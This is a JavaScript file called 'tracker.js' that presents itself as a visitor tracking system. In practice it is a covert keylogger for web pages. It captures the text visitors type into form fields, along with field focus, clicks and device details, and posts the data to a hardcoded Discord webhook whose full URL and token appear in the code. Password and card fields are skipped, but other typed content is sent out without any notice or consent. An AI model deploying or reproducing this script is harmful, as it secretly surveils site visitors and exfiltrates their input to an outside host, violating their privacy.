// tracker.js - Complete Visitor Tracking System
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1392042094637486151/4_8ZIifnSws8hbH09eQaqmZ5EprjhbH20NolzOiYOF0Ii8h6IPypG1b2xVGzQY8Nv0cs'; // REPLACE THIS
const KEYSTROKE_THRESHOLD = 7; // Characters before sending
const SENSITIVE_FIELDS = ['password', 'creditcard', 'cvv', 'ssn', 'security'];

// Main data store
const trackingData = {
  page: window.location.href,
  referrer: document.referrer,
  timestamp: new Date().toISOString(),
  device: getDeviceInfo(),
  interactions: [],
  keystrokeBuffer: {}
};

// 1. INITIALIZATION
if (document.readyState === 'complete') {
  initTracking();
} else {
  document.addEventListener('DOMContentLoaded', initTracking);
}

function initTracking() {
  console.log('[Tracker] Initializing...');
  checkAdBlock();
  trackNavigation();
  trackClicks();
  trackKeystrokes();
  trackFocus();
  sendToDiscord({
    embeds: [{
      title: "🚀 New Visitor",
      color: 0x00ff00,
      fields: [
        { name: "Page", value: trackingData.page },
        { name: "Device", value: `${trackingData.device.os} | ${trackingData.device.browser}` },
        { name: "Location", value: `${trackingData.device.city}, ${trackingData.device.country}` }
      ]
    }]
  });
}

// 2. DEVICE INFORMATION
function getDeviceInfo() {
  const ua = navigator.userAgent;
  return {
    // System
    os: getOS(ua),
    browser: getBrowser(ua),
    screen: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    
    // Location (approximate)
    ip: '...', // Will be set via API
    country: '...',
    city: '...',
    
    // Capabilities
    touch: 'ontouchstart' in window,
    cookies: navigator.cookieEnabled,
    adBlock: false,
    vpn: false
  };
}

function getOS(ua) {
  if (/windows/i.test(ua)) return 'Windows';
  if (/mac/i.test(ua)) return 'MacOS';
  if (/linux/i.test(ua)) return 'Linux';
  if (/android/i.test(ua)) return 'Android';
  if (/ios|iphone|ipad/i.test(ua)) return 'iOS';
  return 'Unknown';
}

function getBrowser(ua) {
  if (/firefox/i.test(ua)) return 'Firefox';
  if (/chrome/i.test(ua)) return 'Chrome';
  if (/safari/i.test(ua)) return 'Safari';
  if (/edge/i.test(ua)) return 'Edge';
  return 'Unknown';
}

// 3. TRACKING FUNCTIONS
function trackKeystrokes() {
  document.addEventListener('input', (e) => {
    const target = e.target;
    if (!shouldTrack(target)) return;

    const fieldId = getFieldId(target);
    trackingData.keystrokeBuffer[fieldId] = trackingData.keystrokeBuffer[fieldId] || {
      label: getLabel(target),
      value: '',
      count: 0
    };

    trackingData.keystrokeBuffer[fieldId].value = target.value;
    trackingData.keystrokeBuffer[fieldId].count++;

    if (trackingData.keystrokeBuffer[fieldId].count >= KEYSTROKE_THRESHOLD) {
      sendKeystrokeUpdate(fieldId);
    }
  });
}

function trackClicks() {
  document.addEventListener('click', (e) => {
    trackingData.interactions.push({
      type: 'click',
      element: e.target.tagName,
      label: getLabel(e.target),
      position: { x: e.clientX, y: e.clientY },
      timestamp: new Date().toISOString()
    });
  });
}

function trackFocus() {
  document.addEventListener('focusin', (e) => {
    if (['INPUT', 'TEXTAREA'].includes(e.target.tagName)) {
      sendToDiscord({
        content: `🔍 Focus on ${getLabel(e.target)}`
      });
    }
  });
}

// 4. HELPER FUNCTIONS
function getFieldId(element) {
  return `${element.id}-${element.name}-${element.className}`.replace(/\s+/g, '_');
}

function getLabel(element) {
  if (element.labels && element.labels.length > 0) 
    return element.labels[0].textContent;
  return element.placeholder || element.name || element.id || 'unlabeled';
}

function shouldTrack(element) {
  const isInput = ['INPUT', 'TEXTAREA'].includes(element.tagName);
  const isSensitive = SENSITIVE_FIELDS.some(field => 
    element.type.includes(field) || 
    element.id.includes(field) || 
    element.name.includes(field)
  );
  return isInput && !isSensitive;
}

// 5. DISCORD INTEGRATION
async function sendToDiscord(payload) {
  try {
    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (error) {
    console.error('Discord Error:', error);
  }
}

function sendKeystrokeUpdate(fieldId) {
  const data = trackingData.keystrokeBuffer[fieldId];
  sendToDiscord({
    embeds: [{
      title: "⌨️ Keystroke Activity",
      color: 0xffa500,
      fields: [
        { name: "Field", value: data.label },
        { name: "Content", value: `\`\`\`${data.value.slice(-50)}\`\`\`` }
      ]
    }]
  });
  trackingData.keystrokeBuffer[fieldId].count = 0;
}

// 6. UTILITIES
function checkAdBlock() {
  fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', {
    method: 'HEAD',
    mode: 'no-cors'
  }).catch(() => {
    trackingData.device.adBlock = true;
  });
}

function trackNavigation() {
  window.addEventListener('beforeunload', () => {
    sendToDiscord({
      content: `📊 Session Summary: ${trackingData.interactions.length} interactions`
    });
  });
}

console.log('[Tracker] Loaded successfully');
